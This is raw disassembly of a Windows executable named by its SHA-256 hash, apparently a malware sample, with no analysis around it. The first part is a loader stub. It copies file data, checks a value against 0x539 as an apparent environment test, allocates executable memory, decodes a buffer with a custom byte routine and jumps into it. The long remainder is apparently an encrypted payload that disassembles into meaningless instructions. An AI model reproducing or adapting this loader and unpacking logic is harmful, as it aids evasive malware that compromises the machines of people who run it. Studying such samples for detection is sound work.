
de3e21b05efc40b0a5fc86c1019637559eaf4128b6694645fa2bdad39fb4334f.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x429228
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x429220
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429050
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429074
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429078
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x429080
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x42907c
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429084
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42908c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429154
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291e8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x4291c0
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429190
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429168
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  ecx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    edx,DWORD PTR [esp+0x10]
  4111a9:	mov    eax,DWORD PTR [esp+0x14]
  4111ad:	add    edx,eax
  4111af:	mov    DWORD PTR [esp+0x10],edx
  4111b3:	ror    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    edx,eax
  4111bb:	shr    edx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,edx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	add    bl,cl
  4111d4:	mov    ecx,DWORD PTR [esp+0x24]
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x58],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x54],0x0
  41120b:	mov    DWORD PTR [ebp-0x4c],0x0
  411212:	mov    DWORD PTR [ebp-0x70],0x0
  411219:	mov    DWORD PTR [ebp-0x60],0x0
  411220:	mov    DWORD PTR [ebp-0x8],0x0
  411227:	mov    DWORD PTR [ebp-0x50],0x0
  41122e:	mov    DWORD PTR [ebp-0x48],0x0
  411235:	mov    DWORD PTR [ebp-0x6c],0x0
  41123c:	mov    DWORD PTR [ebp-0x30],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x2c],0x0
  411251:	mov    DWORD PTR [ebp-0x14],0x0
  411258:	mov    DWORD PTR [ebp-0x10],0x0
  41125f:	mov    DWORD PTR [ebp-0x68],0x0
  411266:	mov    DWORD PTR [ebp-0x5c],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429254
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429258
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42925c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429260
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429244
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429248
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42924c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429250
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429252
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	push   0xa
  4112cd:	call   DWORD PTR ds:0x429158
  4112d3:	lea    eax,[ebp-0x10]
  4112d6:	push   eax
  4112d7:	push   0x429230
  4112dc:	call   DWORD PTR ds:0x429004
  4112e2:	test   eax,eax
  4112e4:	je     0x41133c
  4112e6:	push   0x0
  4112e8:	push   0x0
  4112ea:	push   0x0
  4112ec:	call   DWORD PTR ds:0x429040
  4112f2:	mov    DWORD PTR [ebp-0x14],eax
  4112f5:	lea    ecx,[ebp-0x40]
  4112f8:	push   ecx
  4112f9:	lea    edx,[ebp-0x10]
  4112fc:	push   edx
  4112fd:	call   DWORD PTR ds:0x429000
  411303:	test   eax,eax
  411305:	je     0x41133c
  411307:	push   0x108a
  41130c:	push   0x3873f
  411311:	call   DWORD PTR ds:0x42903c
  411317:	mov    eax,DWORD PTR [ebp-0x10]
  41131a:	add    eax,0x1
  41131d:	mov    DWORD PTR [ebp-0x10],eax
  411320:	push   0x14
  411322:	push   0x0
  411324:	mov    ecx,DWORD PTR [ebp-0x14]
  411327:	push   ecx
  411328:	call   DWORD PTR ds:0x429038
  41132e:	push   0x0
  411330:	push   0x0
  411332:	mov    edx,DWORD PTR [ebp-0x14]
  411335:	push   edx
  411336:	call   DWORD PTR ds:0x429034
  41133c:	mov    BYTE PTR [ebp-0x40],0x56
  411340:	call   DWORD PTR ds:0x429030
  411346:	mov    DWORD PTR [ebp-0x2c],eax
  411349:	mov    BYTE PTR [ebp-0x3e],0x72
  41134d:	movzx  eax,WORD PTR [ebp-0x2c]
  411351:	cmp    eax,0x539
  411356:	jne    0x4113a4
  411358:	mov    BYTE PTR [ebp-0x34],0x0
  41135c:	mov    DWORD PTR [ebp-0x14],0xe0d
  411363:	lea    ecx,[ebp-0x28]
  411366:	push   ecx
  411367:	call   DWORD PTR ds:0x42902c
  41136d:	mov    DWORD PTR [ebp-0x60],eax
  411370:	mov    DWORD PTR [ebp-0x54],0x3a
  411377:	lea    edx,[ebp-0x40]
  41137a:	push   edx
  41137b:	mov    eax,DWORD PTR [ebp-0x60]
  41137e:	push   eax
  41137f:	call   DWORD PTR ds:0x429028
  411385:	mov    DWORD PTR [ebp-0x44],eax
  411388:	mov    DWORD PTR [ebp-0x8],0xe99e94a2
  41138f:	push   0x0
  411391:	mov    ecx,DWORD PTR [ebp-0x70]
  411394:	push   ecx
  411395:	call   DWORD PTR ds:0x429014
  41139b:	mov    DWORD PTR [ebp-0x6c],0x110e87
  4113a2:	jmp    0x4113c5
  4113a4:	mov    BYTE PTR ds:0x448090,0x0
  4113ab:	mov    BYTE PTR ds:0x42e210,0x0
  4113b2:	push   0x0
  4113b4:	mov    edx,DWORD PTR [ebp-0x70]
  4113b7:	push   edx
  4113b8:	call   DWORD PTR ds:0x42914c
  4113be:	mov    BYTE PTR ds:0x446060,0x0
  4113c5:	push   DWORD PTR ds:0x42902c
  4113cb:	pop    edx
  4113cc:	mov    DWORD PTR [ebp-0x68],edx
  4113cf:	push   DWORD PTR [ebp-0x30]
  4113d2:	push   0x1000
  4113d7:	mov    eax,DWORD PTR [ebp-0x14]
  4113da:	add    eax,0x23
  4113dd:	add    eax,0x23
  4113e0:	push   eax
  4113e1:	xor    eax,eax
  4113e3:	push   eax
  4113e4:	mov    ecx,DWORD PTR [ebp-0x44]
  4113e7:	call   ecx
  4113e9:	push   eax
  4113ea:	pop    ecx
  4113eb:	mov    DWORD PTR [ebp-0x4],ecx
  4113ee:	mov    eax,DWORD PTR [ebp-0x6c]
  4113f1:	sub    eax,0xdae0b
  4113f6:	mov    DWORD PTR [ebp-0x6c],eax
  4113f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4113fd:	jne    0x41140e
  4113ff:	push   0x0
  411401:	call   DWORD PTR ds:0x42900c
  411407:	mov    BYTE PTR ds:0x446060,0x0
  41140e:	mov    ecx,DWORD PTR [ebp-0x4]
  411411:	add    ecx,DWORD PTR [ebp-0x14]
  411414:	mov    edx,DWORD PTR [ebp-0x8]
  411417:	mov    DWORD PTR [ecx],edx
  411419:	mov    DWORD PTR [ebp-0x2c],0x410000
  411420:	mov    eax,DWORD PTR [ebp-0x60]
  411423:	push   eax
  411424:	call   DWORD PTR ds:0x429024
  41142a:	mov    ecx,DWORD PTR [ebp-0x4]
  41142d:	add    ecx,DWORD PTR [ebp-0x54]
  411430:	mov    DWORD PTR [ebp-0x5c],ecx
  411433:	mov    edx,DWORD PTR ds:0x429028
  411439:	mov    DWORD PTR [ebp-0x4c],edx
  41143c:	mov    eax,DWORD PTR [ebp-0x4]
  41143f:	add    eax,DWORD PTR [ebp-0x14]
  411442:	mov    ecx,DWORD PTR [ebp+0x8]
  411445:	mov    DWORD PTR [eax+0x4],ecx
  411448:	mov    edx,DWORD PTR [ebp-0x4]
  41144b:	add    edx,DWORD PTR [ebp-0x14]
  41144e:	mov    DWORD PTR [ebp-0xc],edx
  411451:	mov    eax,DWORD PTR [ebp-0x70]
  411454:	push   eax
  411455:	call   DWORD PTR ds:0x429150
  41145b:	cmp    DWORD PTR [ebp-0x6c],0x0
  41145f:	jbe    0x41147c
  411461:	mov    ecx,DWORD PTR [ebp-0xc]
  411464:	push   ecx
  411465:	mov    edx,DWORD PTR [ebp-0x14]
  411468:	push   edx
  411469:	mov    eax,DWORD PTR [ebp-0x2c]
  41146c:	add    eax,DWORD PTR [ebp-0x6c]
  41146f:	push   eax
  411470:	mov    ecx,DWORD PTR [ebp-0x4]
  411473:	push   ecx
  411474:	call   0x411170
  411479:	add    esp,0x10
  41147c:	call   DWORD PTR ds:0x429020
  411482:	cmp    DWORD PTR [ebp-0x5c],0x0
  411486:	je     0x411499
  411488:	push   DWORD PTR [ebp-0x4c]
  41148b:	push   DWORD PTR [ebp-0x68]
  41148e:	mov    edx,DWORD PTR [ebp-0x5c]
  411491:	push   eax
  411492:	jmp    edx
  411494:	jmp    0x422f7a
  411499:	mov    edx,DWORD PTR [ebp+0x8]
  41149c:	mov    DWORD PTR [ebp-0x18],edx
  41149f:	push   0x1
  4114a1:	mov    eax,DWORD PTR [ebp-0x70]
  4114a4:	push   eax
  4114a5:	call   DWORD PTR ds:0x429010
  4114ab:	retf   0x2dfd
  4114ae:	inc    edx
  4114af:	dec    esp
  4114b0:	scas   eax,DWORD PTR es:[edi]
  4114b1:	sbb    cl,BYTE PTR [ebp+0x4d5c1679]
  4114b7:	and    cl,BYTE PTR [ebp+0x35]
  4114ba:	and    al,0xb9
  4114bc:	sbb    eax,0x5316e2d5
  4114c1:	sbb    al,0xbc
  4114c3:	inc    esi
  4114c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114c5:	(bad)  
  4114c6:	jae    0x4114c6
  4114c8:	ss in  eax,0x14
  4114cb:	call   esi
  4114cd:	sub    edi,DWORD PTR [ecx+0x958d738]
  4114d3:	add    dl,bh
  4114d5:	xchg   ebp,eax
  4114d6:	loope  0x41151b
  4114d8:	cwde   
  4114d9:	rcl    DWORD PTR [ecx+ecx*8+0x11],1
  4114dd:	and    eax,0x9c5ffd02
  4114e2:	(bad)  
  4114e4:	mov    ch,0x41
  4114e6:	arpl   bp,si
  4114e8:	sub    BYTE PTR [edi],ah
  4114ea:	mov    ebx,0xcd9ff587
  4114ef:	loop   0x411503
  4114f1:	push   edx
  4114f2:	fisub  WORD PTR [ecx-0x55]
  4114f5:	sub    dh,BYTE PTR [ecx]
  4114f7:	push   esi
  4114f8:	jge    0x41155b
  4114fa:	neg    DWORD PTR [esi+0x4f5cec04]
  411500:	shl    ecx,1
  411502:	in     eax,0xbd
  411504:	mov    ebx,0x4537d6ab
  411509:	pop    ecx
  41150a:	mov    ds:0xabc1562a,eax
  41150f:	(bad)  
  411510:	cmp    eax,DWORD PTR ds:0x75aa5afd
  411516:	push   cs
  411517:	imul   ebp,DWORD PTR cs:[esi+edx*4],0xffffffb3
  41151c:	ret    0xb8ba
  41151f:	xchg   esi,eax
  411520:	pusha  
  411521:	nop
  411522:	mov    BYTE PTR [esp+ebp*2+0x178ad1fc],ch
  411529:	xor    esi,DWORD PTR [eax+0x5c]
  41152c:	fld    QWORD PTR [ebp+0x5b]
  41152f:	cdq    
  411530:	in     eax,dx
  411531:	jecxz  0x41156a
  411533:	in     al,dx
  411534:	out    dx,al
  411535:	xor    esp,esi
  411537:	in     eax,dx
  411538:	outs   dx,BYTE PTR ds:[esi]
  411539:	adc    dl,BYTE PTR [ecx-0xfe8c2f6]
  41153f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411540:	xacquire xchg BYTE PTR [ecx-0x80],ch
  411544:	dec    ebp
  411545:	cmp    BYTE PTR [edx-0xcc4ccce],0xca
  41154c:	addr16 retf 
  41154e:	adc    BYTE PTR [ebx+0x43544607],dh
  411554:	pop    edi
  411555:	fadd   QWORD PTR [esi-0x50bd6f58]
  41155b:	cmp    BYTE PTR [esi+esi*8+0x61],bl
  41155f:	or     al,0xcd
  411561:	in     al,dx
  411562:	cmp    bh,dl
  411564:	cs xor dh,bl
  411567:	xchg   esp,eax
  411568:	iret   
  411569:	xchg   edi,eax
  41156a:	mov    edx,0x91203848
  41156f:	mov    ah,0x15
  411571:	ret    
  411572:	mov    ebx,0xfa27f97b
  411577:	sbb    bl,cl
  411579:	mov    ecx,esi
  41157b:	mov    ebx,0x778ffd8a
  411580:	adc    BYTE PTR [edi-0x1b],al
  411583:	or     DWORD PTR [eax],eax
  411585:	imul   ebx,esi,0xffffffb8
  411588:	pop    es
  411589:	jns    0x411578
  41158b:	mov    ds:0x3d5fee0b,al
  411590:	sub    ebp,DWORD PTR [ecx-0x6e]
  411593:	cmp    eax,0x70fe0998
  411598:	rcl    ch,0x18
  41159b:	pushf  
  41159c:	add    ah,BYTE PTR [edi]
  41159e:	sti    
  41159f:	inc    ebp
  4115a0:	sub    DWORD PTR [ebx-0x5df2dbda],esi
  4115a6:	cmp    al,0x0
  4115a8:	inc    edx
  4115a9:	adc    DWORD PTR [edi+0x5f559ca0],ebp
  4115af:	out    0x45,al
  4115b1:	mov    ds:0xb8c2e4e4,eax
  4115b6:	mov    bl,BYTE PTR [eax+ebx*8]
  4115b9:	xor    eax,0x496eba9d
  4115be:	rcr    DWORD PTR [edi-0x229f63cd],cl
  4115c4:	and    cl,ah
  4115c6:	fcmovu st,st(4)
  4115c8:	mov    dl,0xaa
  4115ca:	mov    ecx,0xbe0908c2
  4115cf:	or     al,0x9f
  4115d1:	xchg   ebp,eax
  4115d2:	xor    esp,ebx
  4115d4:	in     eax,0x2
  4115d6:	mov    al,0x48
  4115d8:	out    dx,al
  4115d9:	sbb    DWORD PTR [edx+eiz*1],0x77
  4115dd:	bound  ebx,QWORD PTR [eax+0x6e]
  4115e0:	sbb    edx,0xa3e622fc
  4115e6:	loope  0x411646
  4115e8:	aas    
  4115e9:	fist   WORD PTR [edi+eiz*4]
  4115ec:	int3   
  4115ed:	in     eax,dx
  4115ee:	clc    
  4115ef:	sub    BYTE PTR [edx+ebx*1+0x68],dl
  4115f3:	pop    ds
  4115f4:	iret   
  4115f5:	inc    ebp
  4115f6:	mov    dh,0xb0
  4115f8:	inc    edi
  4115f9:	and    al,0x31
  4115fb:	jnp    0x41157e
  4115fd:	pop    edx
  4115fe:	mov    BYTE PTR [edi-0x4e],cl
  411601:	into   
  411602:	retf   0xe091
  411605:	sub    eax,0xa2745fff
  41160a:	push   edi
  41160b:	jbe    0x411666
  41160d:	call   DWORD PTR [ecx+0x70411ece]
  411613:	in     eax,dx
  411614:	pop    esi
  411615:	lock daa 
  411617:	in     eax,dx
  411618:	jg     0x4115ed
  41161a:	int    0xca
  41161c:	mov    al,0x60
  41161e:	lods   eax,DWORD PTR ds:[esi]
  41161f:	pop    ss
  411620:	lds    esi,FWORD PTR [esi+0x3bb95c45]
  411626:	ret    
  411627:	sar    BYTE PTR [ecx+0x48e69410],0x13
  41162e:	fwait
  41162f:	dec    ebx
  411630:	mov    cl,0xda
  411632:	xor    DWORD PTR [ebp+0x36],edx
  411635:	adc    BYTE PTR [edi+0x5a25be55],cl
  41163b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41163c:	mov    al,0x5c
  41163e:	xchg   ecx,eax
  41163f:	push   edi
  411640:	arpl   WORD PTR [ebx-0x78],bx
  411643:	sbb    al,0xfe
  411645:	mov    edx,DWORD PTR [esi+0x64]
  411648:	adc    ch,0x58
  41164b:	mov    DWORD PTR [edi],eax
  41164d:	add    DWORD PTR [edi+0x29],esp
  411650:	idiv   BYTE PTR [ecx+edx*4]
  411653:	cmp    DWORD PTR [eax+0x3f],ecx
  411656:	call   0x446d1ae4
  41165b:	(bad)  [edx]
  41165d:	mov    ebx,0xe4b14423
  411662:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  411664:	inc    eax
  411665:	bound  eax,QWORD PTR [esi-0x6f151105]
  41166b:	mov    ebx,0x18856494
  411670:	loop   0x411683
  411672:	pop    es
  411673:	sub    BYTE PTR [ebp+0x3b],0x51
  411677:	(bad)  
  411678:	fwait
  411679:	jns    0x4116bf
  41167b:	mov    al,0x68
  41167d:	push   0x346419f6
  411682:	dec    edx
  411683:	scas   al,BYTE PTR es:[edi]
  411684:	or     DWORD PTR [eax],eax
  411686:	outs   dx,BYTE PTR ds:[esi]
  411687:	mov    bl,BYTE PTR ds:0x5f460c4b
  41168d:	mov    bh,0x8
  41168f:	mov    edx,0x8703fa1a
  411694:	in     eax,dx
  411695:	xchg   esp,eax
  411696:	or     DWORD PTR [esi-0x8b424e0],esi
  41169c:	fs mov ebp,0x422f39e2
  4116a2:	pop    ss
  4116a3:	cmp    bl,0x71
  4116a6:	push   ds
  4116a7:	pop    esi
  4116a8:	loop   0x41163a
  4116aa:	mov    al,0xc6
  4116ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ad:	(bad)  
  4116ae:	retf   0xf8c3
  4116b1:	dec    eax
  4116b2:	cmp    eax,DWORD PTR [edi-0x14]
  4116b5:	ins    DWORD PTR es:[edi],dx
  4116b6:	adc    BYTE PTR [ecx-0x5c8c7b55],bh
  4116bc:	or     BYTE PTR [eax],cl
  4116be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116bf:	shl    DWORD PTR [ebp+0x20],0xae
  4116c3:	ins    DWORD PTR es:[edi],dx
  4116c4:	mov    edi,0xbc3c1bf8
  4116c9:	jnp    0x4116b1
  4116cb:	out    0x82,al
  4116cd:	pop    edx
  4116ce:	sub    ebx,0x6a
  4116d1:	out    dx,eax
  4116d2:	pop    esi
  4116d3:	clc    
  4116d4:	clc    
  4116d5:	mov    WORD PTR [ebp-0x3d955aca],cs
  4116db:	and    eax,0x7a0be7b6
  4116e0:	xchg   esp,eax
  4116e1:	icebp  
  4116e2:	aam    0xe2
  4116e4:	ret    0xa76e
  4116e7:	xchg   esp,eax
  4116e8:	inc    ebp
  4116e9:	(bad)  
  4116ea:	out    dx,al
  4116eb:	test   al,0xc8
  4116ed:	xor    ecx,DWORD PTR [ebp-0x47]
  4116f0:	dec    edi
  4116f1:	xor    esi,eax
  4116f3:	xchg   ecx,eax
  4116f4:	dec    edi
  4116f5:	add    al,0x9
  4116f7:	arpl   WORD PTR es:[eax],di
  4116fa:	pushf  
  4116fb:	fsub   st,st(1)
  4116fd:	scas   eax,DWORD PTR es:[edi]
  4116fe:	and    al,0x4d
  411700:	out    dx,eax
  411701:	mov    eax,0x1e54ca4e
  411706:	fsubp  st(1),st
  411708:	sbb    eax,0xe482bfdc
  41170d:	out    dx,eax
  41170e:	jns    0x41174d
  411710:	jb     0x411692
  411712:	jnp    0x411715
  411714:	sbb    BYTE PTR [eax+edx*1+0x11],bh
  411718:	push   cs
  411719:	shl    BYTE PTR [edx],0x7e
  41171c:	sub    esi,DWORD PTR [eax-0x2adb58a9]
  411722:	jno    0x411745
  411724:	or     edi,esp
  411726:	rcr    BYTE PTR [ecx-0x3b],cl
  411729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41172a:	(bad)  
  41172b:	in     al,0x3d
  41172d:	jns    0x4116f0
  41172f:	add    eax,DWORD PTR [ebx-0x52]
  411732:	(bad)  
  411734:	mov    eax,gs:0xcd9b759d
  41173a:	mul    BYTE PTR [eax+esi*8-0x5f]
  41173e:	in     eax,dx
  41173f:	into   
  411740:	jns    0x4116ee
  411742:	sahf   
  411743:	and    DWORD PTR [ebx-0x987ea72],0xffffffcd
  41174a:	ret    
  41174b:	scas   eax,DWORD PTR es:[edi]
  41174c:	jne    0x411701
  41174e:	fld    TBYTE PTR [esi-0x4b6f94f2]
  411754:	dec    edi
  411755:	sub    eax,0x362a7832
  41175a:	push   0x7064d8d
  41175f:	sub    al,0xde
  411761:	mov    ds:0xb7530b14,al
  411766:	push   esi
  411767:	ret    
  411768:	mov    al,ds:0x33cabfe3
  41176d:	dec    edi
  41176e:	push   ds
  41176f:	scas   al,BYTE PTR es:[edi]
  411770:	(bad)  
  411771:	shl    esp,cl
  411773:	ret    0x6b37
  411776:	pop    edi
  411777:	sti    
  411778:	aad    0x10
  41177a:	mov    esp,DWORD PTR [ecx+0x34]
  41177d:	xchg   esi,eax
  41177e:	fs xor eax,0x2e226c30
  411784:	push   ecx
  411785:	dec    ebx
  411786:	pop    ecx
  411787:	dec    esp
  411788:	sbb    DWORD PTR [ebx*8-0x51e06983],eax
  41178f:	or     eax,DWORD PTR gs:[ecx+0x7dd28a8d]
  411796:	stc    
  411797:	(bad)  
  411798:	jle    0x411803
  41179a:	jne    0x4117e8
  41179c:	push   esi
  41179d:	jae    0x411739
  41179f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117a0:	dec    ecx
  4117a1:	mov    DWORD PTR fs:[eax+eax*4],edi
  4117a5:	out    0x91,eax
  4117a7:	cmp    BYTE PTR [edx-0x3c167bf3],al
  4117ad:	out    0x9,eax
  4117af:	mov    BYTE PTR [esi-0x1b],cl
  4117b2:	mov    WORD PTR ds:0x1eed,?
  4117b7:	or     DWORD PTR ds:[edx-0x42effa52],0xffffffcd
  4117bf:	cli    
  4117c0:	adc    edi,DWORD PTR [ecx]
  4117c2:	add    DWORD PTR [edx+0x564a3da],esp
  4117c8:	and    BYTE PTR [edx+edx*1],bl
  4117cb:	push   ds
  4117cc:	mov    WORD PTR [eax],ds
  4117ce:	push   eax
  4117cf:	mov    bh,0x97
  4117d1:	cli    
  4117d2:	inc    ebx
  4117d3:	mov    eax,0xa3556459
  4117d8:	call   ecx
  4117da:	(bad)  
  4117dc:	je     0x4117b6
  4117de:	cwde   
  4117df:	and    ebx,esi
  4117e1:	dec    eax
  4117e2:	aam    0x60
  4117e4:	fcom   DWORD PTR [ebp-0x5ebd51fd]
  4117ea:	into   
  4117eb:	sbb    BYTE PTR [edi],al
  4117ed:	pushf  
  4117ee:	scas   al,BYTE PTR es:[edi]
  4117ef:	or     bh,BYTE PTR [ecx+0x61]
  4117f2:	outs   dx,BYTE PTR ds:[esi]
  4117f3:	jo     0x4117de
  4117f5:	and    eax,0x11c06153
  4117fa:	cmp    ebp,DWORD PTR [esp+edx*2-0x5a]
  4117fe:	es xchg edi,eax
  411800:	ja     0x411838
  411802:	cs scas eax,DWORD PTR es:[edi]
  411804:	push   ds
  411805:	aam    0x5a
  411807:	into   
  411808:	mov    edi,0xa59efea7
  41180d:	ret    0x8d47
  411810:	mov    ch,0x75
  411812:	jmp    0xf1de:0xaba1b125
  411819:	test   al,0xff
  41181b:	mov    ch,0xef
  41181d:	pop    ebx
  41181e:	stos   DWORD PTR es:[edi],eax
  41181f:	cmp    DWORD PTR [edi+0x7a],0xffffffbe
  411823:	sub    WORD PTR [ebx],dx
  411826:	call   FWORD PTR [eax]
  411828:	out    0x3e,al
  41182a:	xor    BYTE PTR [eax],dl
  41182c:	and    BYTE PTR [esi],0x6d
  41182f:	ins    DWORD PTR es:[edi],dx
  411830:	nop
  411831:	pop    ebp
  411832:	mov    BYTE PTR [ecx*2-0x2a137a32],bh
  411839:	xchg   edx,eax
  41183a:	out    0xba,eax
  41183c:	shl    dh,1
  41183e:	dec    esi
  41183f:	pop    edx
  411840:	mov    dl,0x8
  411842:	dec    edx
  411843:	mov    dh,0xd
  411845:	push   DWORD PTR [esi+0x3c2bb416]
  41184b:	mov    al,ds:0xb7d1d055
  411850:	sub    esi,DWORD PTR ds:0x20f87c43
  411856:	jns    0x4118a6
  411858:	dec    ecx
  411859:	outs   dx,DWORD PTR ds:[esi]
  41185a:	mov    al,0xdb
  41185c:	(bad)  
  41185d:	jge    0x411873
  41185f:	js     0x411896
  411861:	cmp    al,0x1
  411863:	retf   
  411864:	xchg   bh,dl
  411866:	rol    DWORD PTR [ebp+0x7beda92c],cl
  41186c:	(bad)  
  41186d:	mov    edx,0x7c54d642
  411872:	call   0x555a6061
  411877:	cld    
  411878:	dec    ecx
  411879:	cli    
  41187a:	test   al,0xfa
  41187c:	call   0x8af5:0x968115bc
  411883:	shr    DWORD PTR [ecx-0x7c],0x12
  411887:	into   
  411888:	fdivrp st(7),st
  41188a:	dec    ebp
  41188b:	lock sub BYTE PTR [ecx+0xc],ch
  41188f:	in     eax,0x26
  411891:	xchg   BYTE PTR ds:0x8f8cfa4f,bh
  411897:	jp     0x411890
  411899:	pop    edx
  41189a:	add    bh,BYTE PTR [eax]
  41189c:	mov    bh,BYTE PTR [eax]
  41189e:	ret    
  41189f:	mov    ebp,0xe9e415c0
  4118a4:	xchg   ebx,eax
  4118a5:	add    eax,0xbe6efbf1
  4118aa:	inc    edx
  4118ab:	mov    ebx,?
  4118ad:	pop    edi
  4118ae:	xchg   edx,eax
  4118af:	pop    edx
  4118b0:	popf   
